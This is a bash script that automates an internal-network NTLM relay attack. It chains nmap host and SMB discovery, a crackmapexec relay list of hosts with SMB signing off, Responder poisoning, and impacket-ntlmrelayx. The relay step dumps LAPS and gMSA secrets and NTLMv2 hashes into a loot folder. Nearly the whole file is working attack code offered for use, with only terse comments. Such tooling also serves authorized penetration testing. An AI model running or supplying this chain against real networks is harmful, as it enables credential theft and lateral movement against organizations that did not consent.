#!/bin/bash

echo ''
echo "  _____           _____           ______        _   _____      _             "
echo " |  __ \         / ____|         |  ____|      | | |  __ \    | |            "
echo " | |__) | __ ___| (___   ___  ___| |__ __ _ ___| |_| |__) |___| | __ _ _   _ "
echo " |  ___/ '__/ _ \\\\\___ \ / _ \/ __|  __/ _\` / __| __|  _  // _ \ |/ _\` | | | |"
echo " | |   | | | (_) |___) |  __/ (__| | | (_| \__ \ |_| | \ \  __/ | (_| | |_| |"
echo " |_|   |_|  \___/_____/ \___|\___|_|  \__,_|___/\__|_|  \_\___|_|\__,_|\__, |"
echo "                                                                        __/ |"
echo "                                                                       |___/ "
echo ''

IP=$(ip addr show eth0 | grep "inet " | cut -d '/' -f1 | cut -d ' ' -f6)
#echo '! > OwnIP eth0: '$IP

#echo '! > Network to scan in /root/input/ipint.txt for nmap'

if [ -s /root/input/ipint.txt ]; then
    echo "! >ipint.txt exists."
else 
    echo "! > ipint.txt missing in /root/input/ipint.txt."
	exit 1
fi

if [ -d /root/output/nmap -a -d /root/output/list -a -d /root/input/msf -a -d /root/output/loot -a -d /root/output/msf ]; then
    echo '! > Folder Exist!'
else    
    #Creating Output Folders
    mkdir -p /root/output/nmap /root/output/list /root/input/msf /root/output/loot /root/output/msf
    #echo '! > Folder Created!'
fi

#NMAP PE SCAN
if [ -s /root/output/list/ipup.txt ]; then
	echo '! > nmap PE already done'
else
   #echo '! > NMAP PE Scan    FAST'
   nmap -PE -sn -n --max-retries 2 --max-hostgroup 20 --scan-delay 1 -oA /root/output/nmap/pe -iL /root/input/ipint.txt > /dev/null 2>&1
   #echo ''
   #echo '! >> Done'

   #Piping the IP-Addresses of the Targets to a file
   awk '/Up/ {print$2}' /root/output/nmap/pe.gnmap > /root/output/list/ipup.txt
   #echo ''
fi

if [ -s /root/output/list/smb_open.txt ]; then
   echo '! > SMB Open File already exists, CME is next!'
else
   #NMAP Portscan for port 445
   #echo '! > NMAP Portscan 445'
   nmap -p 445 --max-retries 2 --max-hostgroup 20 --scan-delay 1 -oA /root/output/nmap/445 -iL /root/output/list/ipup.txt > /dev/null 2>&1
   #echo ''
   #echo '! >> Done'

   #Piping IP's with 445 open to a file
   awk '/open/ {print$2}' /root/output/nmap/445.gnmap > /root/output/list/smb_open.txt
   #echo ''
fi

if [ -s /root/output/list/smb_sign_off.txt ]; then
   echo '! > SMB Signing List already exist, Responder and NTLMRELAY are next!'
else
   #Using Crackmap to Check which of the IP's with 445 open have Signing:false
   #echo '! > Generating Relay List'
   crackmapexec smb /root/output/list/smb_open.txt --gen-relay-list /root/output/list/smb_sign_off.txt >> /root/output/cme_beauty.txt
   #echo '! >> Done'
fi

#When Clients with Signing:false exist
if [ -s /root/output/list/smb_sign_off.txt ] 
	then
	echo ''
	
	#Responder with 300sec timeout in bg
	echo '! > Starting Responder && impacket-ntlmrelayx'
	timeout 300 responder -I eth0 -rdwv >> /root/output/responder.txt &
	#echo ''
	#echo '! >> Done'
	#echo ''

	#NTLMRelayX with 300sec timeout in bg to relay ntlm to hosts without signing enabled
	#echo '! > Starting NTLM-Relay'
	timeout 300 impacket-ntlmrelayx -ip $IP -ts -ra --dump-laps --dump-gmsa -l /root/output/loot -of /root/output/loot/ntlm_relay_ntlmv2.txt --remove-mic -smb2support -tf /root/output/list/smb_sign_off.txt >> /root/output/relay.txt &
	#echo ''

	#Declaring variables for each PID of Responder and NTLMRelayX
	#echo '! >> Waiting for Hashes'

	PID_RESPONDER=`jobs -l | awk '/responder/ {print$2}'`
	PID_RELAY=`jobs -l | awk '/ntlmrelayx/ {print$2}'`

	#Waiting for Jobs to despawn
	wait $PID_RESPONDER
	wait $PID_RELAY
	
	#When Output-File exists and is not empty
	if [ -s /root/output/loot/ntlm_relay_ntlmv2.txt ]; then
		#Show me 'dem Hashes
		echo '! > Got Hashes!'
	else
		echo '! >> No Hashes Found'
	fi
else
	echo '! > Either Signing is ON everywhere or no SMB Service available.'
fi
